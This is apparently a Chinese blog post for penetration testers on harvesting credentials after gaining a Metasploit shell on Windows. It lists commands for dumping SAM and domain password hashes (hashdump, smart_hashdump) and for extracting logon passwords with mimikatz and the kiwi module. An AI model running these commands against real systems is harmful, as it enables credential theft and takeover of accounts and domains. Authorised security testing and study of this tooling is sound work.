---
title: msf后渗透中抓密码
id: 126
date: 2024-01-09 20:09:12
auther: yrl
cover: 
excerpt: 导出密码hash下面命令均是在msf获得shell后的操作，前提是主机设置了开机自动登录run windows/gather/credentials/windows_autologin查看主机是否设置了开机自动登录run hashdump命令hashdump模块可以从SAM数据库中导出本地用户账号，
permalink: /archives/msf%E5%90%8E%E6%B8%97%E9%80%8F%E4%B8%AD%E6%8A%93%E5%AF%86%E7%A0%81
categories:
 - web渗透
tags: 
 - msf
 - 抓密码
---

# 导出密码hash
下面命令均是在msf获得shell后的操作，前提是主机设置了开机自动登录
`run windows/gather/credentials/windows_autologin`查看主机是否设置了开机自动登录
## run hashdump命令
hashdump模块可以从SAM数据库中导出本地用户账号，该命令的使用需要系统权限

## run windows/gather/smart_hashdump命令
  run windows/gather/smart_hashdump命令的使用需要系统权限。该功能更强大，如果当前用户是域管理员用户，则可以导出域内所有用户的hash
## 使用mimikatz抓取密码

1. 上传mimikatz程序：
  我们可以上传mimikatz程序，然后执行mimikatz程序来获取明文密码；执行mimikatz必须System权限（执行getuid查看），并且在执行时，要根据当前的系统位数进行选择；查看系统位数（sysinfo），可以看出当前系统位数为X64位。

	选择x64位的mimikatz上传至目标服务器：upload filepath
2. 运行mimikatz
进入mimikatz交互界面：execute -i -f mimikatz.exe
```bash
privilege::debug
sekurlsa::logonpasswords
```
即可输出密码hash

## 使用load kiwi（使用kiwi模块需要获取SYSTEM权限)

kiwi_cmd 模块可以让我们使用mimikatz的全部功能，mimikatz的命令直接在kiwi_cmd里面直接使用
终端输入 `load kiwi` 第一次使用需要加载
```bash
creds_all //获取密码
kiwi_cmd sekurlsa::logonpasswords //获取密码
```
## mimikatz更多用法
https://zhuanlan.zhihu.com/p/398375645